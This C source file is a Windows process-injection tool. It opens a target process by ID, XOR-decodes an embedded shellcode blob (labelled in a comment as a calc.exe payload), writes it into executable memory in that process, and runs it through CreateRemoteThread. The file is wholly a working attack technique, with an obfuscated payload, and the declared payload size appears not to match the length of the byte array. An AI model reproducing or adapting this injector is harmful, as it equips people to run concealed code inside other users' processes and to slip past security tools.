#include <windows.h>
#include <stdio.h>
#include <stdbool.h>
int main(int argc, char* argv[]){
    if (argc == 1){
        printf("[*] Usage: inject.exe <PID>");
        return 0;
    }

    int pid = atoi(argv[1]);
    printf("[*] PID: %d\n", pid);

    HANDLE hProc = OpenProcess( // get a handle to a process
        PROCESS_ALL_ACCESS,
        FALSE,
        pid
    );
    if (hProc == NULL){
        printf("[*] Failed to obtain handle, exiting...");
        return 0;
    }
    printf("[*] Obtained handle: %x\n", hProc);

	unsigned char key = '\x69'; // if payload isnt xor encrypted, set key to \x00

	unsigned char shellcode[] = //payload - calc.exe
		"\x4c\x6f\x17\xca\x34\x97\x3a\x64\xde\xc9\x82\x65\xbd\x74\x1b\x7b\x47\x55\x8e\x3e\x6a\xe9\x75\x55\xa5\x1d\xf5\xff\x36\xa3\x01\x60\xc5\xf3\x78\x68\x3d\xd6\x43\x52\x0c\x1f\x13\x4c\xa6\xbc\x6f\x0c\x7e\xe7\xc7\x4f\x1f\x2e\xf5\x0f\xa7\x85\x38\x87\x12\x93\x0e\x55\x0c\x2a\x20\x52\x97\x05\xf2\x1a\x72\x37\x8d\x17\xca\xda\xf1\x18\x39\xe0\xc5\xae\x7b\x9d\x56\xe9\x57\xd6\xb6\x07\x41\xe7\x5a\xd6\x2f\xab\x7a\xce\xb6\xf4\x48\x96\x8e\xcc\xed\xe0\x1e\xc7\x9c\x31\x83\x5e\x31\x1a\x0c\x22\x6b\xcf\x99\x17\xc6\x07\x21\x0e\x7d\x6a\x9d\xae\xe7\xce\xa8\xd2\xd8\x29\x68\xc5\x82\x68\xb3\x51\xb7\x40\x15\xa1\xfe\xed\x21\xf5\x59\x9e\xd6\x23\xa1\x1f\x73\x68\xa5\xe9\x20\x04\x59\x19\x52\x58\x5f\xa8\x0c\x64\x24\x66\xc5\xe4\x2a\x4b\x13\x65\x3c\x1f\xb4\x4c\xd3\xb7\xee\xe7\xef\xcf\x49\xc6\x88\xad\x3f\x52\x10\x83\x51\xe7\x6c\xc7\x0b\x48\x26\x2b\x74\x4b\xc7\x14\x8d\x57\x29\xd4\xe4\x3a\x9a\x12\x94\x36\x0c\xba\xc0\x23\x97\x9f\x6f\x56\x10\x55\x16\x86\xde\xfb\xf8\x88\xda\xf7\x66\x8b\x1d\x75\x38\xd2\x13\xcf\x6a\x0b\x3a\xd6\x13\x3d\x4f\x77\x1b\xf5\xec\xfd\x7d\x24\x42\x28\x63\x1a\xed\xd3\x2f\xa7\xbe\x65\x68\x82\xfb\xc7\xe8\x21\x99\x7f\xa4\xc5\xb3\x0d\x22\x66\x5a\x36\xad\x5d\x2b\xdd\x51\x74\xa7\x38\x6b\xbe\x00\xeb\xa1\xed\x87\xbd\x01\x3a\x8e\x78\xb3\x75\xd0\x97\x23\xb2\xdc\xf7\x24\x58\xd4\xa4\x87\xe4\xf0\x38\x39\xc5\x56\xa9\xdf\x80\x82\xee\x95\xcf\x92\xf2\x1b\x81\x8a\x88\x4c\x5b\x0b\xb6\xfa\x03\x39\xd7\x0f\x95\x93\xb0\xfa\xcd\xd8\xd4\x0d\x6b\x43\x36\x42\xe9\x02\x73\x3e\x30\x86\xc0\xbf\xee\x29\xa0\xe7\x03\x32\x54\x07\x55\x10\x46\x08\x1b\xb7\x23\xf1\x0b\xe1\x31\x1b\xa0\x13\x77\xb3\xa2\xbc\x09\xd5\x67\x9d\x7b\xb0\xb8\x12\x10\x0c\x78\xc1\xd9\xef\x3d\xde\xc4\x7b\x1a\x9a\x32\x3c\x28\x95\xcc\x1d\xea\x4b\xe5\x00\x3c\xb9\xcc\x63\xe1\x23\x4b\xb5\x2d\x5f\x97\x3a\x4b\xd9\x2a\x5f\x6b\x16\x73\x4b\x0a\x80\xa2\xc6\x5b\xa4\x35\xa9\xc4\x8d\x62\x1f\x88\x84\x84\xc1\xde\xa6\xe8\x16\x46\x25\x26\x32\x87\xc5\xde\x61\xf5\xc2\xd2\x33\xac\x5d\x47\x0a\x9c\x48\x8c\x3a\x39\x8c\x99\x0a\x42\x0d\x49\x9c\x31\xc7\xca\x74\x2a\xfd\xca\x12\xaf\x49\x70\x67\x58\xed\x6b\xfc\x7f\x34\xfc\xec\x90\x9d\x29\x0d\x17\xc8\xa3\xd9\x67\x89\x5c\xbf\x87\x65\x18\x34\xfe\x85\x42\x77\x21\x15\x9e\x47\xb9\x93\x51\xd3\x93\x55\x85\x66\x6e\x90\x59\xbb\xf2\xbf\x2a\x7a\x19\xf9\xac\xb9\x8d\x44\x2c\x8b\xbe\x4d\xb6\xf6\x99\x36\xc1\x74\x0f\x2b\x5f\x0e\x3d\x70\x98\x9d\xf4\xb7\x7c\xc4\xe5\xa5\xe2\x2f\x21\x8b\x72\x00\x01\x15\xb7\xdb\x8f\xb7\x82\xaf\xa3\x63\x74\x69\x76\xbd\x7e\xac\x53\x4c\x45\xa1\xa3\x2e\x58\x4b\xc3\xec\x03\x6c\xc8\xa9\x10\xde\xa0\x36\x5e\x88\xe0\xdc\x23";
	int shellcodesize=287;

	for (int i = 0; i < shellcodesize; i++){
		shellcode[i]=shellcode[i]^key;
	}



    LPVOID addr_pointer = VirtualAllocEx( // allocate the needed memory
		hProc,
		NULL,
		shellcodesize,
		(MEM_COMMIT | MEM_RESERVE),
		PAGE_EXECUTE_READWRITE
	);

	printf("[*] Pointer to allocated memory: %x\n", addr_pointer);

	bool res = WriteProcessMemory(
		hProc,
		addr_pointer,
		shellcode,
		shellcodesize,
		NULL
	);
	if (res==0){
		printf("something got fucked, exiting...");
		return 0;
	}
	printf("[*] Memory allocated succesfully\n");

	HANDLE hThread = CreateRemoteThread(
		hProc,
		NULL,
		0,
		(LPTHREAD_START_ROUTINE) addr_pointer,
		NULL,
		0,
		NULL
	);


	printf("[*] Shellcode injected, exiting...");



    return 0;

}

